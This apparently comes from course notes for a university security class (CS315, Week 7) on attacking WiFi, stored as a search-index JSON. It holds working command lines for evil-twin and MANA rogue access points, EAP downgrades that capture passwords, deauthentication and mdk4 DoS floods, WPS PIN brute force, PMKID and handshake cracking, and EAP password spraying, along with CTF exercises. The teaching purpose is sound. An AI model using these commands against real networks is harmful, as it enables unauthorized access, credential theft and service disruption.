phones will only see the \"name\" or ESSID of a wireless network (as the base station is not required to authenticate against the client). This actually makes it very hard to distinguish between networks with the same name and same kind of encryption. In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users. Due how the implementation of clients work (remember that the 802.11 protocol allows stations to roam freely between access points within the same ESS), it is possible to make a device to change the base station it is connected to. It is possible to do that offering a better signal (which is not always possible) or by blocking the access to the original base station (deauthentication packets, jamming, or some other form of DoS attack). Notice also that real-world wireless deployments usually have more than a single access point, and these access points are often more powerful and have better line-of-site range due to their placement towards the ceiling. Deauthenticating a single access point usually results in the target roaming towards another valid access point rather than your rogue AP, unless all nearby access points are deauthenticated (loud) or you are very careful with the placement of the rogue AP (difficult). You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing: airbase-ng -a 00:09:5B:6F:64:1E --essid \"Elroy\" -c 1 wlan0mon You could also create an Evil Twin using eaphammer (notice that to create evil twins with eaphammer the interface should NOT be in monitor mode): ./eaphammer -i wlan0 --essid exampleCorp --captive-portal Or using Airgeddon: Options: 5,6,7,8,9 (inside Evil Twin attack menu). Please, notice that by default if an ESSID in the PNL is saved as WPA protected, the device won't connect automatically to an Open evil Twin. You can try to DoS the real AP and hope that the user will connect manually to your Open evil twin, or you could DoS the real AP an use a WPA Evil Twin to capture the handshake (using this method you won't be able to let the victim connect to you as you don't know the PSK, but you can capture the handshake and try to crack it). Some OS and AV will warn the user that connect to an Open network is dangerous... WPA/WPA2 Evil Twin You can create an Evil Twin using WPA/2 and if the devices have configured to connect to that SSID with WPA/2, they are going to try to connect. Anyway, to complete the 4-way-handshake you also need to know the password that the client is going to use. If you don't know it, the connection won't be completed . ./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase \"mywifipassword\" Enterprise Evil Twin To understand this attacks I would recommend to read before the brief WPA Enterprise explanation . Using hostapd-wpe hostapd-wpe needs a configuration file to work. To automate the generation if these configurations you could use https://github.com/WJDigby/apd_launchpad (download the python file inside /etc/hostapd-wpe/ ) ./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com hostapd-wpe ./victim/victim.conf -s In the configuration file you can select a lot of different things like ssid, channel, user files, cret/key, dh parameters, wpa version and auth... Using hostapd-wpe with EAP-TLS to allow any certificate to login. Using EAPHammer # Generate Certificates./eaphammer --cert-wizard # Launch Attack./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds By default, EAPHammer purposes this authentication methods (notice GTC as the first one to try to obtain plaintext passwords and then the use of more robust auth methods): GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 This is the default methodology to avoid long connection times. However, you can also specify to server the authentication methods from weakest to strongest: --negotiate weakest Or you could also use: --negotiate gtc-downgrade to use highly efficient GTC downgrade implementation (plaintext passwords) --negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect). Find more info in the wiki Using Airgeddon Airgeddon can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to capture the user and the MD5 of the password . Later, the attacker can try to crack the password. Airggedon offers you the possibility of a continuous Evil Twin attack (noisy) or only create the Evil Attack until someone connects (smooth). Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS Inside the configuration of hostapd-wpe comment the line that contains dh_file* * (from dh_file=/etc/hostapd-wpe/certs/dh to #dh_file=/etc/hostapd-wpe/certs/dh ) This will make hostapd-wpe to exchange keys using RSA instead of DH, so you will be able to decrypt the traffic later knowing the servers private key**. Now start the Evil Twin using hostapd-wpe with that modified configuration as usual. Also, start wireshark in the interface which is performing the Evil Twin attack. Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit... Add a new entry and fill the form with this values: IP address = any -- Port = 0 -- Protocol = data -- Key File ( select your key file , to avoid problems select a key file without being password protected ). And look at the new \"Decrypted TLS\" tab : KARMA, MANA, Loud MANA and Known beacons attack ESSID and MAC black/whitelists The following table lists the different type of MFACLs (Management Frame Access Control Lists) available, as well their effects when used: # example EAPHammer MFACL file, wildcards can be used78:f0:97:fc:b5:369a:35:e1:01:4f:cf69:19:14:60:20:45ce:52:b8:*:*:* [--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting][--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting] # example ESSID-based MFACL fileapplesorangesgrapespears [--ssid-whitelist /path/to/mac/whitelist/file.txt][--ssid-blacklist /path/to/mac/blacklist/file.txt] KARMA Karma attacks are a second form of rogue access point attack that exploits the network selection process used by stations. In a whitepaper written in 2005, Dino Dai Zovi and Shane Macaulay describe how an attacker can configure an access point to listen for directed probe requests and respond to all of them with matching directed probe responses. This causes the affected stations to automatically send an association request to the attacker\u2019s access point. The access point then replies with an association response, causing the affected stations to connect to the attacker. MANA According to Ian de Villiers and Dominic White, modern stations are designed to protect themselves against karma attacks by ignoring directed probe responses from access points that have not already responded to at least one broadcast probe request. This led to a significant drop in the number of stations that were vulnerable to karma attacks until 2015, when White and de Villiers developed a means of circumventing such protections. In White\u2019s and de Villiers\u2019 improved karma attack (MANA attack), directed probe responses are used to reconstruct the PNLs of nearby stations. When a broadcast probe request is received from a station, the attacker\u2019s access point responds with an arbitrary SSID from the station\u2019s PNL already being saw in a direct probe from that device. In resume, the MANA algorithm works like this: each time the access point receives a probe request, it first determines whether it\u2019s a broadcast or directed probe. If it\u2019s directed probe, the sender\u2019s MAC address is added to the hash table (if it\u2019s not there already) and the ESSID is added to that device\u2019s PNL. The AP then responds with a directed probe response. If it\u2019s a broadcast probe, the access point responds with probe responses for each of the networks in that device\u2019s PNL. MANA attack using eaphammer: ./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds] Loud MANA Notice that the standard MANA attack still does not allow us to attack devices that don\u2019t use directed probing at all. So if we also doesn't know previously any entry inside the device PNL, we need to figure out some other way to attack it. A possibility is what is called Loud MANA attack. This attack relies on the idea that client devices within close physical proximity to one another are likely to have at least some common entries in their PNLs. In resume, Loud MANA attack instead of responding to probe requests with each ESSID in a particular device\u2019s PNL, the rogue AP sends probe responses for every ESSID in every PNL across all devices that it has seen before. Relating this to set theory, we can say that the AP sends probe responses for each ESSID in the union of all PNLs of nearby devices. ./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds] Known Beacon attack There are still cases in which Loud MANA attack won\u2019t succeed. The Known Beacon attack is a way to \"Brute-Force\" ESSIDs to try to get the victim connect to the attacker. The attacker creates an AP that response to any ESSID and run some code sending beacons faking ESSIDs of each name inside a wordlist. Hopefully the victim will contains some of theses ESSID names inside its PNL and will try to connect to the fake AP. Eaphammer implemented this attack as a MANA attack where all the ESSIDs inside a list are charged (you could also combine this with --loud to create a Loud MANA + Known beacons attack): ./eaphammer -i wlan0 --mana [--loud] --known-beacons --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds] Known Beacon Burst attack As known beacons are loud. You can use a script inside Eaphammer project to just launch beacouns of every ESSID name inside a file very quickly. If you combines this script with a Eaphammer MANA attack, the clients will be able to connect to your AP. # transmit a burst of 5 forged beacon packets for each entry in list ./forge-beacons -i wlan1 \\ --bssid de:ad:be:ef:13:37 \\ --known-essids-file known-s.txt \\ --dst-addr 11:22:33:11:22:33 \\ --burst-count 5 Other tools Wifite2 This tool automates WPS/WEP/WPA-PSK attacks. It will automatically: Set the interface in monitor mode Scan for possible networks - And let you select the victim(s) If WEP - Launch WEP attacks If WPA-PSK If WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs. Try to capture the PMKID from the AP to crack it Try to deauthenticate clients of the AP to capture a handshake If PMKID or Handshake, try to bruteforce using top5000 passwords. Exercise (4 pt) Insecure WPA WiFi standards update so quick. Some security problems, some new attack ideas, balabala... I just don't want to update my router. Seriously, who would hack my wireless network? flag format: flag{md5 of the WiFi password} capture.cap (4 pt) \u91ce\u7363\u5148\u8f29\uff08\u3084\u3058\u3085\u3046\u305b\u3093\u3071\u3044\uff09's traffic sniff My \u305b\u3093\u3071\u3044 (seniority) invited me to play games in his house. The seniority treated me with delicious black tea. But his WiFi is too slow to play video games. So, I'm going to debug this wireless network. 114514.7z (2 pt) wifi Wang uploaded a Godzilla Trojan to server upload-labs. The memory image, wifi traffic, and the server's traffic are saved. Wang used Trojan to run cat /flag , and you are given these files. Find the flag. chall.zip","title":"Week7 WLAN: Attacking WiFi"},{"location":"CS315/Week%207/#week7-wlan-attacking-wifi","text":"","title":"Week7 WLAN: Attacking WiFi"},{"location":"CS315/Week%207/#wifi-basic-commands","text":"ip link show #List available interfaces iwconfig #List available interfaces airmon-ng check kill #Kill annoying processes airmon-ng start wlan0 #Monitor mode airmon-ng stop wlan0mon #Managed mode airodump-ng wlan0mon #Scan (default 2.4Ghz) airodump-ng wlan0mon --band a #Scan 5Ghz iwconfig wlan0 mode monitor #Put in mode monitor iwconfig wlan0mon mode managed #Quit mode monitor - managed mode iw dev wlan0 scan | grep \"^BSS\\|SSID\\|WSP\\|Authentication\\|WPS\\|WPA\" #Scan available wifis","title":"Wifi basic commands"},{"location":"CS315/Week%207/#tools","text":"","title":"Tools"},{"location":"CS315/Week%207/#eaphammer","text":"git clone https://github.com/s0lst1c3/eaphammer.git ./kali-setup","title":"EAPHammer"},{"location":"CS315/Week%207/#airgeddon","text":"mv `which dhcpd` `which dhcpd`.old apt install isc-dhcp-server apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe","title":"Airgeddon"},{"location":"CS315/Week%207/#run-airgeddon-with-docker","text":"docker run \\ --rm \\ -ti \\ --name airgeddon \\ --net=host \\ --privileged \\ -p 3000:3000 \\ -v /tmp:/io \\ -e DISPLAY=$(env | grep DISPLAY | awk -F \"=\" '{print $2}') \\ v1s1t0r1sh3r3/airgeddon From: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux","title":"Run airgeddon with docker"},{"location":"CS315/Week%207/#resume-attacks","text":"DoS Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client) Random fake APs -- Hide nets, possible crash scanners) Overload AP -- Try to kill the AP (usually not very useful) WIDS -- Play with the IDS TKIP, EAPOL -- Some specific attacks to DoS some APs Cracking Crack WEP (several tools and methods) WPA-PSK WPS pin \"Brute-Force\" WPA PMKID bruteforce [DoS +] WPA handshake capture + Cracking WPA-MGT Username capture Bruteforce Credentials Evil Twin (with or without DoS) Open Evil Twin [+ DoS] -- Useful to capture captive portal creds and/or perform LAN attacks WPA-PSK Evil Twin -- Useful to network attacks if you know the password WPA-MGT -- Useful to capture company credentials MANA , Loud MANA , Known beacon + Open -- Useful to capture captive portal creds and/or perform LAN attacks + WPA -- Useful to capture WPA handshakes","title":"Resume attacks"},{"location":"CS315/Week%207/#dos","text":"","title":"DOS"},{"location":"CS315/Week%207/#deauthentication-packets","text":"The most common way this sort of attack is done is with deauthentication packets. These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks , as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking. Aside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network. Description from here .","title":"Deauthentication Packets"},{"location":"CS315/Week%207/#deauthentication-using-aireplay-ng","text":"aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 00:14:6C:7E:40:80 is the MAC address of the access point -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work) ath0 is the interface name","title":"Deauthentication using Aireplay-ng"},{"location":"CS315/Week%207/#disassociation-packets","text":"Disassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily the way they are used. An AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area. Description from here . This attack can be performed by mdk4(mode \"d\"): # -c <channel> # -b victim_client_mac.txt contains the MAC address of the device to eliminate # -e WifiName is the name of the wifi # -B BSSID is the BSSID of the AP # Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F","title":"Disassociation Packets"},{"location":"CS315/Week%207/#more-dos-attacks-by-mdk4","text":"From here . ATTACK MODE b: Beacon Flooding Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers! # -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit # -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES) # -m use real BSSIDS # All the parameters are optional and you could load ESSIDs from a file mdk4 wlan0mon b -a -w nta -m ATTACK MODE a: Authentication Denial-Of-Service Sends authentication frames to all APs found in range. Too many clients can freeze or reset several APs. # -a BSSID send random data from random clients to try the DoS # -i BSSID capture and repeat pakets from authenticated clients # -m use real MACs # only -a or -i can be used mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m ATTACK MODE p: SSID Probing and Bruteforcing Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range. Bruteforcing of hidden SSIDs with or without a wordlist is also available. ATTACK MODE m: Michael Countermeasures Exploitation Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs . AP will then shutdown for a whole minute, making this an effective DoS . # -t <BSSID> of a TKIP AP # -j use inteligent replay to create the DoS mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j] ATTACK MODE e: EAPOL Start and Logoff Packet Injection Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages . # Use Logoff messages to kick clients mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l] ATTACK MODE s: Attacks for IEEE 802.11s mesh networks Various attacks on link management and routing in mesh networks. Flood neighbors and routes, create black holes and divert traffic! ATTACK MODE w: WIDS Confusion Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs. # -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts) mkd4 -e <SSID> -c <channel> [-z] ATTACK MODE f: Packet Fuzzer A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful!","title":"More DOS attacks by mdk4"},{"location":"CS315/Week%207/#airggedon","text":"Airgeddon offers most of the attacks proposed in the previous comments:","title":"Airggedon"},{"location":"CS315/Week%207/#wps","text":"WPS stands for Wi-Fi Protected Setup. It is a wireless network security standard that tries to make connections between a router and wireless devices faster and easier. WPS works only for wireless networks that use a password that is encrypted with the WPA Personal or WPA2 Personal security protocols. WPS doesn't work on wireless networks that are using the deprecated WEP security, which can be cracked easily by any hacker with a basic set of tools and skills. (From here ) WPS uses a 8 length PIN to allow a user to connect to the network, but it's first checked the first 4 numbers and, if correct, then is checked the second 4 numbers. Then, it is possible to Brute-Force the first half and then the second half (only 11000 possibilities).","title":"WPS"},{"location":"CS315/Week%207/#wps-bruteforce","text":"There are 2 main tools to perform this action: Reaver and Bully. Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations. Bully is a new implementation of the WPS brute force attack, written in C. It has several advantages over the original reaver code: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture. Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success. If the WPS valid code is found, both Bully and Reaver will use it to discover the WPA/WPA2 PSK used to protect the network, so you will be able to connect anytime you need it. reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3","title":"WPS Bruteforce"},{"location":"CS315/Week%207/#smart-brute-force","text":"Instead of starting trying every possible PIN, you should check if there are available PINs discoveredfor the AP you are attacking (depending of the manufacturer MAC) and the PIN software generated PINs . The database of known PINs is made for Access Points of certain manufacturers for which it is known that they use the same WPS PINs. This database contains the first three octets of MAC-addresses and a list of corresponding PINs that are very likely for this manufacturer. There are several algorithms for generating WPS PINs. For example, ComputePIN and EasyBox use the MAC-address of the Access Point in their calculations. But the Arcadyan algorithm also requires a device ID.","title":"Smart Brute force"},{"location":"CS315/Week%207/#wps-pixie-dust-attack","text":"Dominique Bongard discovered that some APs have weak ways of generating nonces (known as E-S1 and E-S2 ) that are supposed to be secret. If we are able to figure out what these nonces are, we can easily find the WPS PIN of an AP since the AP must give it to us in a hash in order to prove that it also knowns the PIN, and the client is not connecting to a rouge AP. These E-S1 and E-S2 are essentially the \"keys to unlock the lock box\" containing the WPS pin. More info here: https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack) Basically, some implementations failed in the use of random keys to encrypt the 2 parts of the the PIN(as it is discomposed in 2 parts during the authentication communication and sent to the client), so an offline attack could be used to brute force the valid PIN. reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv bully wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3","title":"WPS Pixie Dust attack"},{"location":"CS315/Week%207/#null-pin-attack","text":"Some really bad implementations allowed the Null PIN to connect (very weird also). Reaver can test this (Bully cannot). reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''","title":"Null Pin attack"},{"location":"CS315/Week%207/#airgeddon_1","text":"All the proposed WPS attacks can be easily performed using *airgeddon.* 5 and 6 lets you try your custom PIN (if you have any) 7 and 8 perform the Pixie Dust attack 13 allows you to test the NULL PIN 11 and 12 will recollect the PINs related to the selected AP from available databases and generate possible PINs using: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?) 9 and 10 will test every possible PIN","title":"Airgeddon"},{"location":"CS315/Week%207/#wep","text":"So broken and disappeared that I am not going to talk about it. Just know that *airgeddon* have a WEP option called \"All-in-One\" to attack this kind of protection. More tools offer similar options.","title":"WEP"},{"location":"CS315/Week%207/#wpawpa2-psk","text":"","title":"WPA/WPA2 PSK"},{"location":"CS315/Week%207/#pmkid","text":"In 2018 hashcat authors disclosed a new type of attack which not only relies on one single packet , but it doesn\u2019t require any clients to be connected to our target AP or, if clients are connected, it doesn\u2019t require us to send deauth frames to them, there\u2019s no interaction between the attacker and client stations, but just between the attacker and the AP, interaction which, if the router is vulnerable, is almost immediate! It turns out that a lot of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called Robust Security Network , which includes something called PMKID As explained in the original post, the PMKID is derived by using data which is known to us: PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) Since the \u201cPMK Name\u201d string is constant, we know both the BSSID of the AP and the station and the PMK is the same one obtained from a full 4-way handshake , this is all hashcat needs in order to crack the PSK and recover the passphrase! Description obtained from here . To gather this information and bruteforce locally the password you can do: airmon-ng check kill airmon-ng start wlan0 git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1 #You can also obtains PMKIDs using eaphammer ./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1 The PMKIDs captured will be shown in the console and also saved inside /tmp/attack.pcap* * Now, convert the capture to hashcat/john** format and crack it: hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt Please note the the format of a correct hash contains 4 parts , like: 4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7*566f6461666f6e65436f6e6e6563743034383131343838 If yours only contains 3 parts , then, it is invalid (the PMKID capture wasn't valid). Note that hcxdumptool also capture handshakes (something like this will appear: MP:M1M2 RC:63258 EAPOLTIME:17091 ). You could transform the handshakes to hashcat / john format using cap2hccapx tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap cap2hccapx pmkid.pcapng pmkid.hccapx [\"Filter_ESSID\"] hccap2john pmkid.hccapx > handshake.john john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool.","title":"PMKID"},{"location":"CS315/Week%207/#handshake-capture","text":"One way to attack WPA/WPA2 networks is to capture a handshake and try to crack the used password offline . To do so you need to find the BSSID and channel of the victim network, and a client that is connected to the network. Once you have that information you have to start listening to all the commutation of that BSSID in that channel , because hopefully the handshake will be send there: airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap Now you need to deauthenticate the client for a few seconds so it will automatically authenticate again to the AP (please read the part of DoS to find several ways to deauthenticate a client): aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network. Once in the airodump-ng appears some handshake information this means that the handshake was captured and you can stop listening: Once the handshake is captured you can crack it with aircrack-ng : aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap","title":"Handshake capture"},{"location":"CS315/Week%207/#check-if-handshake-in-file","text":"","title":"Check if handshake in file"},{"location":"CS315/Week%207/#aircrack","text":"aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture","title":"aircrack"},{"location":"CS315/Week%207/#tshark","text":"tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.","title":"tshark"},{"location":"CS315/Week%207/#cowpatty","text":"cowpatty -r psk-01.cap -s \"ESSID\" -f - If this tool finds an uncompleted handshake of an ESSID before the completed one, it won't detect the valid one.","title":"cowpatty"},{"location":"CS315/Week%207/#pyrit","text":"apt-get install pyrit #Not working for newer versions of kali pyrit -r psk-01.cap analyze","title":"pyrit"},{"location":"CS315/Week%207/#wpa-enterprise-mgt","text":"It is important to talk about the different authentication methods that could be used by an enterprise Wifi. For this kind of Wifis you will probably find in airodump-ng something like this: 6A:FE:3B:73:18:FB -58 19 0 0 1 195 WPA2 CCMP MGT NameOfMyWifi EAP (Extensible Authentication Protocol) the skull of the authentication communication , on top of this, an authentication algorithm is used by the server to authenticate the client ( supplicant ) and in same cases by the client to authenticate the server. Main authentication algorithms used in this case: EAP-GTC: Is an EAP method to support the use of hardware tokens and one-time passwords with EAP-PEAP. Its implementation is similar to MSCHAPv2, but does not use a peer challenge. Instead, passwords are sent to the access point in plaintext (very interesting for downgrade attacks). EAP-MD-5 (Message Digest) : The client send the MD5 hash of the password. Not recommended : Vulnrable to dictionary attacks, no server authentication and no way to generate per session wired equivalent privacy (WEP) keys. EAP-TLS (Transport Layer Security) : It relies on client-side and server-side certificates to perform authentication and can be used to dynamically generate user-based and session-based WEP keys to secure subsequent communications. EAP-TTLS (Tunneled Transport Layer Security) : Mutual authentication of the client and network through an encrypted channel (or tunnel), as well as a means to derive dynamic, per-user, per-session WEP keys. Unlike EAP-TLS, EAP-TTLS requires only server-side certificates (client will use credentials) . PEAP (Protected Extensible Authentication Protocol) : PEAP is like the EAP protocol but creating a TLS tunnel to protect the communication. Then, weak authentication protocols can by used on top of EAP as they will be protected by the tunnel. PEAP-MSCHAPv2 : This is also known as just PEAP because it is widely adopted. This is just the vulnerable challenge/response called MSCHAPv2 on to of PEAP (it is protected by the TLS tunnel). PEAP-EAP-TLS or just PEAP-TLS : Is very similar to EAP-TLS but a TLS tunnel is created before the certificates are exchanged. You can find more information about these authentication methods here and here .","title":"WPA Enterprise (MGT)"},{"location":"CS315/Week%207/#username-capture","text":"Reading https://tools.ietf.org/html/rfc3748#page-27 it looks like if you are using EAP the \"Identity\" messages must be supported , and the username is going to be sent in clear in the \"Response Identity\" messages. Even using one of the most secure of authentication methods: PEAP-EAP-TLS , it is possible to capture the username sent in the EAP protocol . To do so, capture a authentication communication (start airodump-ng inside a channel and wireshark in the same interface) and filter the packets by eapol . Inside the \" Response, Identity \" packet, the username of the client will appear.","title":"Username Capture"},{"location":"CS315/Week%207/#anonymous-identities","text":"(Info taken from https://www.interlinknetworks.com/app_notes/eap-peap.htm) Both EAP-PEAP and EAP-TTLS support identity hiding . In a WiFi environment, the access point (AP) typically generates an EAP-Identity request as part of the association process. To preserve anonymity, the EAP client on the user\u2019s system may respond with only enough information to allow the first hop RADIUS server to process the request, as shown in the following examples. EAP-Identity = anonymous In this example, all users will share the pseudo-user-name \u201canonymous\u201d. The first hop RADIUS server is an EAP-PEAP or EAP-TTLS server which drives the server end of the PEAP or TTLS protocol. The inner (protected) authentication type will then be either handled locally or proxied to a remote (home) RADIUS server. EAP-Identity = anonymous@realm_x In this example, users belonging to different realms hide their own identity but indicate which realm they belong to so that the first hop RADIUS server may proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms which will act as the PEAP or TTLS server. The first hop server acts purely as a RADIUS relay node. Alternatively, the first hop server may act as the EAP-PEAP or EAP-TTLS server and either process the protected authentication method or proxy it to another server. This option may be used to configure different policies for different realms. In EAP-PEAP, once the PEAP server and the PEAP client establish the TLS tunnel, the PEAP server generates an EAP-Identity request and transmits it down the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user\u2019s true identity down the encrypted tunnel. This prevents anyone eavesdropping on the 802.11 traffic from discovering the user\u2019s true identity. EAP-TTLS works slightly differently. With EAP-TTLS, the client typically authenticates via PAP or CHAP protected by the TLS tunnel. In this case, the client will include a User-Name attribute and either a Password or CHAP-Password attribute in the first TLS message sent after the tunnel is established. With either protocol, the PEAP/TTLS server learns the user\u2019s true identity once the TLS tunnel has been established. The true identity may be either in the form user@realm or simply user* *. If the PEAP/TTLS server is also authenticating the user **, it now knows the user\u2019s identity and proceeds with the authentication method being protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user\u2019s home RADIUS server. This new RADIUS request has the PEAP or TTLS protocol stripped out. If the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user\u2019s true identity \u2013 not the anonymous identity from the User-Name attribute of the incoming RADIUS request. If the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes recovered from the TLS payload are placed in the outgoing RADIUS message in place of the anonymous User-Name and TTLS EAP-Message attributes included in the incoming RADIUS request.","title":"Anonymous Identities"},{"location":"CS315/Week%207/#eap-bruteforce-password-spray","text":"If the client is expected to use a username and password (notice that EAP-TLS won't be valid in this case), then you could try to get a list a usernames (see next part) and passwords and try to bruteforce the access using air-hammer . ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt You could also do this attack using eaphammer : ./eaphammer --eap-spray \\ --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \\ --essid example-wifi \\ --password bananas \\ --user-list users.txt","title":"EAP-Bruteforce (password spray)"},{"location":"CS315/Week%207/#client-attacks-theory","text":"","title":"Client attacks Theory"},{"location":"CS315/Week%207/#network-selection-and-roaming","text":"Although the 802.11 protocol has very specific rules that dictate how a station can join an ESS, it does not specify how the station should select an ESS to connect to. Additionally, the protocol allows stations to roam freely between access points that share the same ESSID (because you wouldn\u2019t want to lose WiFi connectivity when walking from one end of a building to another, etc). However, the 802.11 protocol does not specify how these access points should be selected. Furthermore, even though stations must be authenticated to the ESS in order to associate with an access point, the 802.11 protocol does not require the access point be authenticated to the station.","title":"Network Selection and Roaming"},{"location":"CS315/Week%207/#preferred-network-lists-pnls","text":"Each time a station connects to a wireless network, the network\u2019s ESSID is stored in the station\u2019s Preferred Network List (PNL). The PNL is an ordered list of every network that the station has connected to in the past, and each entry in the PNL contains the network\u2019s ESSID and any network-specific configuration information needed to establish a connection.","title":"Preferred Network Lists (PNLs)"},{"location":"CS315/Week%207/#passive-scanning","text":"In infrastructure networks, access points periodically transmit beacon frames to advertise their presence and capabilities to nearby stations. Beacons are broadcast frames, which means they are intended to be received by all nearby stations in range. Beacons include information about the AP\u2019s supported rates, encryption capabilities, additional information, and most importantly, beacon frames contain the AP\u2019s ESSID (as long as ESSID broadcasting is not disabled). During passive scanning, the client device listens for beacon frames from nearby access points. If the client device receives a beacon frame whose ESSID field matches an ESSID from the client\u2019s PNL, the client will automatically connect to the access point that sent the beacon frame. Then, suppose we want to target a wireless device that is not currently connected to any wireless. If we know at least one entry in that client\u2019s PNL, we can force the client to connect to us simply by creating our own access point with that entry\u2019s ESSID.","title":"Passive Scanning"},{"location":"CS315/Week%207/#active-probing","text":"The second network selection algorithm used in 802.11 is known as Active Probing. Client devices that use active probing continuously transmit probe request frames to determine what APs are within range, as well as 